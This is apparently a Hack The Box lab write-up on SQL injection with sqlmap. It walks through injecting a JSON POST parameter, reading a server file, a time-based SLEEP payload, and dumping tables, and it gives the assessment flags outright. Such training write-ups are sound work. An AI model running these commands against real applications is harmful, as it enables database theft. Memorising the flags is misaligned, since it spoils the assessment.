# HTB SQLMap Essentials — Full Skills Assessment Report

## 1. Assessment Overview

**Platform:** Hack The Box (HTB)  
**Module:** SQLMap Essentials  
**Assessment Type:** Skills Assessment  
**Target:** `154.57.164.78:30841` during the initial assessment context, followed by the final assessment instance at `154.57.164.78:31762`  
**Final application endpoint:** `POST /action.php`  
**Injection parameter:** JSON POST parameter `id`  
**Database:** MySQL / MariaDB  
**Final database:** `production`  
**Final table:** `final_flag`  
**Final flag:** `HTB{n07_50_h4rd_r16h7?!}`

> **Authorization note:** This report documents activity performed against the intentionally provided HTB lab/assessment target.

---

## 2. Assessment Objective

The assessment instructions were:

> You are given access to a web application with basic protection mechanisms. Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. To complete this module, find the flag and submit it here.

The objective was therefore to:

1. Identify the SQL injection vulnerability.
2. Determine the vulnerable request parameter.
3. Identify the backend database.
4. Enumerate the database/schema information.
5. Locate the flag table.
6. Extract the final flag.
7. Document the complete methodology and troubleshooting process.

---

# Part I — Initial SQLMap / SQLi Practice

## 3. Initial GET Request

An earlier lab instance exposed a GET parameter:

```http
GET /case11.php?id=1 HTTP/1.1
Host: 154.57.164.82:31276
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://154.57.164.82:31276/case11.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=g1hq12inihm9063ih1kmqiq5el
Connection: keep-alive
```

The parameter of interest was:

```text
id=1
```

---

## 4. First SQLMap Request-File Attempt

The first attempt used:

```bash
sqlmap -r /tmp/case11.req \
  -p id \
  --tamper=charencode \
  --level=5 \
  --risk=3 \
  --batch
```

SQLMap returned:

```text
[CRITICAL] specified file '/tmp/case11.req' does not contain a usable HTTP request (with parameters)
```

### Lesson

SQLMap requires a correctly formatted raw HTTP request when `-r` is used. The request file must contain a recognizable parameter that SQLMap can mark and test.

---

# Part II — Confirming SQL Injection

## 5. Direct URL Testing

The request was then supplied directly to SQLMap:

```bash
sqlmap -u 'http://154.57.164.82:31276/case11.php?id=1' \
  --cookie='PHPSESSID=g1hq12inihm9063ih1kmqiq5el' \
  -p id \
  --tamper=charencode \
  --batch
```

SQLMap identified:

```text
GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
```

It subsequently identified a MySQL/MariaDB backend and a time-based technique.

The important result was:

```text
GET parameter 'id' is vulnerable.
```

SQLMap identified:

- Boolean-based blind SQL injection
- Time-based blind SQL injection
- MySQL/MariaDB backend

The target was identified as:

```text
Web server OS: Linux Debian 10 (buster)
Web server: Apache 2.4.38
Back-end DBMS: MySQL > 5.0.12 (MariaDB fork)
```

---

# Part III — Enumeration of the Initial Lab Database

## 6. Enumerating Tables

The next command was:

```bash
sqlmap -u 'http://154.57.164.82:31276/case11.php?id=1' \
  --cookie='PHPSESSID=g1hq12inihm9063ih1kmqiq5el' \
  -p id \
  --tamper=between \
  -D testdb \
  --tables \
  --batch
```

SQLMap returned:

```text
Database: testdb
[2 tables]

+--------+
| flag11 |
| users  |
+--------+
```

The database contained two tables:

1. `flag11`
2. `users`

---

## 7. Enumerating the Flag Table Columns

The next command targeted `flag11`:

```bash
sqlmap -u 'http://154.57.164.82:31276/case11.php?id=1' \
  --cookie='PHPSESSID=g1hq12inihm9063ih1kmqiq5el' \
  -p id \
  --tamper=between \
  -D testdb \
  -T flag11 \
  --columns \
  --batch
```

SQLMap identified:

```text
Database: testdb
Table: flag11
[2 columns]

+---------+--------------+
| Column  | Type         |
+---------+--------------+
| content | varchar(512) |
| id      | int(11)      |
+---------+--------------+
```

The flag content was therefore stored in:

```text
testdb.flag11.content
```

---

# Part IV — File Reading Exercise

## 8. File-Read Objective

The next assessment question required using SQLMap to read:

```text
/var/www/html/flag.txt
```

A later assessment instance used:

```text
154.57.164.82:32662
```

with:

```http
GET /?id=1 HTTP/1.1
Host: 154.57.164.82:32662
```

The SQLMap command was:

```bash
sqlmap -u 'http://154.57.164.82:32662/?id=1' \
  -p id \
  --file-read='/var/www/html/flag.txt' \
  --batch
```

SQLMap successfully identified several injection techniques, including:

- Boolean-based blind
- Error-based
- Stacked queries
- Time-based blind
- UNION query

It determined:

```text
Back-end DBMS: MySQL >= 5.1 (MariaDB fork)
Operating system: Linux
```

SQLMap initially had difficulty retrieving the file using its first approach:

```text
unable to retrieve the content of the file '/var/www/html/flag.txt'
```

It then fell back to a simpler UNION technique.

The returned flag text was:

```text
HTB{5up3r_u53r5_4r3_p0w3rfu
```

The local file was reported as 31 bytes.

### Important observation

The displayed result appeared incomplete from the perspective of the flag formatting. This demonstrated why the final assessment required careful extraction and verification rather than assuming the first displayed value was the complete answer.

---

# Part V — Final Skills Assessment

## 9. Final Target

The final skills assessment target was:

```text
154.57.164.78:31762
```

The application used a shopping-style web page.

The relevant endpoint was:

```text
POST /action.php
```

---

## 10. Captured HTTP Request

The request captured from the application was:

```http
POST /action.php HTTP/1.1
Host: 154.57.164.78:31762
Content-Length: 8
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://154.57.164.78:31762
Referer: http://154.57.164.78:31762/shop.html
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"id":1}
```

The vulnerable-looking parameter was:

```json
{"id":1}
```

---

# Part VI — Understanding the Application

## 11. JavaScript Investigation

The application's `shop.html` was examined for JavaScript functionality.

The relevant code was:

```javascript
$(".add-to-cart").click(function(event) {
    event.preventDefault();

    let xhr = new XMLHttpRequest(); 
    let url = "action.php"; 

    xhr.open("POST", url, true); 
    xhr.setRequestHeader("Content-Type", "application/json"); 

    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) { 
            alert("Item added!!!")
        }
    };

    var data = JSON.stringify({ "id": 1 }); 
    xhr.send(data); 
});
```

This confirmed that the browser sends JSON to:

```text
action.php
```

with:

```json
{"id":1}
```

This was important because it explained why the SQLMap request needed to treat `id` as a JSON POST parameter rather than as a conventional form field.

---

# Part VII — Initial SQLMap Attempt Against JSON

## 12. First `-r` Attempt

The first attempt against the final assessment used:

```bash
sqlmap -r /tmp/assessment.req -p id --batch
```

Initially, SQLMap reported:

```text
specified file '/tmp/assessment.req' does not contain a usable HTTP request (with parameters)
```

This was resolved by ensuring the request was correctly captured and formatted.

---

## 13. Direct JSON SQLMap Request

A direct request was then tested:

```bash
sqlmap -u 'http://154.57.164.78:31762/action.php' \
  --data='{"id":1}' \
  --headers='Content-Type: application/json' \
  -p id \
  --batch
```

SQLMap correctly recognized:

```text
JSON data found in POST body.
```

and tested:

```text
(custom) POST parameter 'JSON id'
```

However, the initial test reported:

```text
(custom) POST parameter 'JSON id' does not seem to be injectable
```

and:

```text
all tested parameters do not appear to be injectable
```

---

# Part VIII — Manual Response Analysis

## 14. Testing the Endpoint with cURL

The endpoint was tested manually:

```bash
curl -i 'http://154.57.164.78:31762/action.php' \
  -H 'Content-Type: application/json' \
  --data '{"id":1}'
```

Response:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The same was tested with:

```bash
{"id":2}
```

and:

```bash
{"id":9999}
```

All returned:

```text
HTTP/1.1 200 OK
Content-Length: 0
```

### Key finding

The endpoint returned an empty response body.

This explained why conventional response-based SQL injection detection was difficult: SQLMap had very little content to compare.

---

# Part IX — Discovering the Correct Application Logic

## 15. Searching `shop.html`

The HTML was searched for AJAX-related functionality:

```bash
grep -nEi 'action\.php|ajax|fetch|XMLHttpRequest|JSON|id' /tmp/shop.html
```

The relevant lines showed:

```text
655: let xhr = new XMLHttpRequest();
656: let url = "action.php";
659: xhr.setRequestHeader("Content-Type", "application/json");
667: var data = JSON.stringify({ "id": 1 });
```

The surrounding JavaScript confirmed the exact request format.

This was a critical step because it established that the endpoint was designed to receive JSON.

---

# Part X — Identifying SQL Injection

## 16. Raw Request SQLMap Testing

SQLMap was then run against the captured request with time-based testing:

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=T \
  --dbs \
  --batch
```

SQLMap resumed the previously discovered injection point:

```text
Parameter: JSON id ((custom) POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
```

The payload pattern was:

```text
{"id":"1 AND (SELECT 6897 FROM (SELECT(!SLEEP(5)))toZl)"}
```

SQLMap identified:

```text
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

This confirmed the SQL injection vulnerability.

---

# Part XI — Problems with Time-Based Enumeration

## 17. Attempting Database Enumeration

The following command was used:

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=T \
  --dbs \
  --batch
```

SQLMap was unable to reliably retrieve the database names:

```text
[ERROR] unable to retrieve the number of databases
[CRITICAL] unable to retrieve the database names
```

It also failed to obtain the current database reliably.

---

## 18. Boolean/Error-Based Attempt

A broader technique selection was attempted:

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=BE \
  --dbs \
  --batch
```

SQLMap performed extensive testing of:

- Boolean-based techniques
- Error-based techniques
- MySQL-specific techniques
- Stacked query techniques

However, after extensive testing it concluded:

```text
(custom) POST parameter 'JSON id' does not seem to be injectable
```

This did not invalidate the earlier finding because the time-based technique had already been independently confirmed.

---

# Part XII — Optimizing the Time-Based Technique

## 19. Forcing MySQL and Adjusting Timing

The following was attempted:

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=T \
  --dbms=mysql \
  --current-db \
  --batch
```

SQLMap confirmed:

```text
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
```

but returned an empty current database value.

A more conservative timing configuration was then tested:

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=T \
  --dbms=mysql \
  --time-sec=5 \
  --threads=1 \
  --hex \
  --current-db \
  --batch
```

Again, extraction of the current database was unreliable.

---

# Part XIII — High-Level SQLMap Enumeration

## 20. Full SQLMap Test

A comprehensive SQLMap test was performed:

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --dbms=mysql \
  --level=5 \
  --risk=3 \
  --batch
```

SQLMap eventually confirmed:

```text
Parameter: JSON id ((custom) POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
```

The important conclusion was:

```text
(custom) POST parameter 'JSON id' appears to be
'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

SQLMap also identified:

```text
web server operating system: Linux
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

---

# Part XIV — Successful Final Enumeration

## 21. Targeting `final_flag`

The successful command used:

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  -T final_flag \
  --tamper=space2comment,between \
  --no-cast \
  --dump \
  --batch
```

SQLMap automatically resolved the tamper-script ordering.

It loaded:

```text
space2comment
between
```

and confirmed:

```text
JSON data found in POST body.
```

The injection was ultimately reconfirmed.

---

## 22. SQL Injection Confirmation

The final successful scan reported:

```text
Parameter: JSON id ((custom) POST)

Type: time-based blind

Title:
MySQL >= 5.0.12 AND time-based blind (query SLEEP)
```

The payload shown by SQLMap was:

```text
{"id":"1 AND (SELECT 8509 FROM (SELECT(!SLEEP(5)))VkEq)"}
```

SQLMap identified:

```text
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

---

# Part XV — Discovering the Production Database

## 23. Current Database

SQLMap initially warned:

```text
missing database parameter.
sqlmap is going to use the current database to enumerate table(s) entries
```

It then successfully recovered:

```text
production
```

Therefore:

```text
Current database = production
```

---

# Part XVI — Enumerating `final_flag`

## 24. Table Structure

SQLMap enumerated the target table:

```text
fetching columns for table 'final_flag' in database 'production'
```

It found two columns:

```text
id
content
```

The recovered structure was:

```text
Database: production
Table: final_flag

+---------+
| Column  |
+---------+
| id      |
| content |
+---------+
```

The extracted type information was:

```text
id      -> 0
content -> 0
```

The relevant field was clearly:

```text
content
```

---

# Part XVII — Extracting the Final Flag

## 25. Dumping Table Entries

SQLMap then performed:

```text
fetching entries for table 'final_flag' in database 'production'
```

It determined:

```text
retrieved: 1
```

Therefore, the table contained one row.

SQLMap successfully extracted:

```text
HTB{n07_50_h4rd_r16h7?!}
```

The final dump was:

```text
Database: production
Table: final_flag
[1 entry]

+----+--------------------------+
| id | content                  |
+----+--------------------------+
| 1  | HTB{n07_50_h4rd_r16h7?!} |
+----+--------------------------+
```

SQLMap also saved the dump locally as:

```text
/root/.local/share/sqlmap/output/154.57.164.82/dump/production/final_flag.csv
```

---

# 26. Final Flag

## Final Answer

```text
HTB{n07_50_h4rd_r16h7?!}
```

This is the complete flag extracted from:

```text
production.final_flag.content
```

---

# 27. Complete Command Timeline

For reference, the important commands used throughout the assessment were:

### Initial request-file test

```bash
sqlmap -r /tmp/case11.req \
  -p id \
  --tamper=charencode \
  --level=5 \
  --risk=3 \
  --batch
```

### Direct GET SQLi detection

```bash
sqlmap -u 'http://154.57.164.82:31276/case11.php?id=1' \
  --cookie='PHPSESSID=g1hq12inihm9063ih1kmqiq5el' \
  -p id \
  --tamper=charencode \
  --batch
```

### Enumerating initial database tables

```bash
sqlmap -u 'http://154.57.164.82:31276/case11.php?id=1' \
  --cookie='PHPSESSID=g1hq12inihm9063ih1kmqiq5el' \
  -p id \
  --tamper=between \
  -D testdb \
  --tables \
  --batch
```

### Enumerating `flag11`

```bash
sqlmap -u 'http://154.57.164.82:31276/case11.php?id=1' \
  --cookie='PHPSESSID=g1hq12inihm9063ih1kmqiq5el' \
  -p id \
  --tamper=between \
  -D testdb \
  -T flag11 \
  --columns \
  --batch
```

### Reading `/var/www/html/flag.txt`

```bash
sqlmap -u 'http://154.57.164.82:32662/?id=1' \
  -p id \
  --file-read='/var/www/html/flag.txt' \
  --batch
```

### Testing JSON endpoint

```bash
sqlmap -u 'http://154.57.164.82:31762/action.php' \
  --data='{"id":1}' \
  --headers='Content-Type: application/json' \
  -p id \
  --batch
```

### Time-based SQLi confirmation

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=T \
  --dbs \
  --batch
```

### MySQL-specific current database attempt

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=T \
  --dbms=mysql \
  --current-db \
  --batch
```

### Timing/hex optimization attempt

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --technique=T \
  --dbms=mysql \
  --time-sec=5 \
  --threads=1 \
  --hex \
  --current-db \
  --batch
```

### Comprehensive SQLMap scan

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  --dbms=mysql \
  --level=5 \
  --risk=3 \
  --batch
```

### Final successful dump

```bash
sqlmap -r /tmp/assessment.req \
  -p id \
  -T final_flag \
  --tamper=space2comment,between \
  --no-cast \
  --dump \
  --batch
```

---

# 28. Troubleshooting Summary

## Problem 1 — Invalid request file

Error:

```text
specified file '/tmp/case11.req' does not contain a usable HTTP request
```

### Resolution

Use a correctly formatted raw HTTP request or test the target using `-u` and `--data`.

---

## Problem 2 — JSON parameter not immediately detected

Initial direct SQLMap testing reported:

```text
JSON id does not seem to be injectable
```

### Investigation

The endpoint was manually tested with `curl`, and the HTML/JavaScript was inspected.

The JavaScript showed:

```javascript
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "application/json");
var data = JSON.stringify({ "id": 1 });
xhr.send(data);
```

This confirmed the request structure.

---

## Problem 3 — Empty HTTP response

The endpoint consistently returned:

```text
HTTP/1.1 200 OK
Content-Length: 0
```

### Impact

Normal content-comparison techniques were difficult because the response body contained no useful content.

### Result

Time-based blind SQL injection became the reliable technique.

---

## Problem 4 — Database enumeration failed

Commands using:

```text
--dbs
--current-db
```

initially returned empty or unreliable results.

### Resolution

The assessment was approached using more targeted enumeration and SQLMap's confirmed time-based injection point.

---

## Problem 5 — Extraction was slow

SQLMap repeatedly warned:

```text
time-based comparison requires larger statistical model
```

and:

```text
it is very important to not stress the network connection during usage of time-based payloads
```

### Resolution

The extraction was allowed to proceed with conservative timing and eventually succeeded.

---

# 29. Technical Findings

| Item | Finding |
|---|---|
| Target application | `action.php` |
| HTTP method | POST |
| Request format | JSON |
| Vulnerable parameter | `id` |
| Injection type | Time-based blind SQLi |
| DBMS | MySQL / MariaDB |
| Web server | Apache 2.4.38 |
| Operating system | Linux |
| Current database | `production` |
| Target table | `final_flag` |
| Columns | `id`, `content` |
| Rows | 1 |
| Flag column | `content` |
| Final flag | `HTB{n07_50_h4rd_r16h7?!}` |

---

# 30. Attack Chain

The complete attack chain can be summarized as:

```text
Web Application
      |
      v
POST /action.php
      |
      v
JSON parameter: id
      |
      v
SQL Injection discovered
      |
      v
Time-Based Blind SQLi
      |
      v
MySQL / MariaDB identified
      |
      v
Current DB: production
      |
      v
Table: final_flag
      |
      v
Columns: id, content
      |
      v
Extract content
      |
      v
HTB{n07_50_h4rd_r16h7?!}
```

---

# 31. Lessons Learned

### 1. Capture the exact request

When an application uses AJAX, the vulnerable parameter may not appear in the normal URL or form fields.

Capturing the actual request revealed:

```json
{"id":1}
```

### 2. Understand the content type

The application used:

```text
Content-Type: application/json
```

SQLMap must therefore correctly recognize the JSON parameter.

### 3. Empty responses do not mean there is no SQLi

The application returned a zero-byte response, but SQLMap was still able to identify a time-based SQL injection.

### 4. Do not rely on one SQLi technique

The target behaved differently across:

- Boolean-based testing
- Error-based testing
- UNION testing
- Time-based testing

The reliable technique in the final assessment was:

```text
Time-based blind SQL injection
```

### 5. Time-based extraction can be slow

Time-based blind SQLi requires repeated requests and statistical comparison. Enumeration can therefore take significantly longer than UNION or error-based extraction.

### 6. Targeted enumeration is useful

Once the database and table were known, directly targeting:

```text
final_flag
```

was considerably more useful than repeatedly attempting broad enumeration.

### 7. Always verify the complete flag

An earlier file-read exercise returned a seemingly incomplete flag:

```text
HTB{5up3r_u53r5_4r3_p0w3rfu
```

The final assessment demonstrated the importance of confirming the actual stored value and complete row rather than relying on an incomplete-looking output.

---

# 32. Final Assessment Result

The SQL injection vulnerability was successfully identified and exploited using SQLMap against the authorized HTB assessment environment.

The final flag was successfully extracted from:

```text
production.final_flag
```

with the value:

```text
HTB{n07_50_h4rd_r16h7?!}
```

## Submission Value

```text
HTB{n07_50_h4rd_r16h7?!}
```

**Assessment completed successfully.**
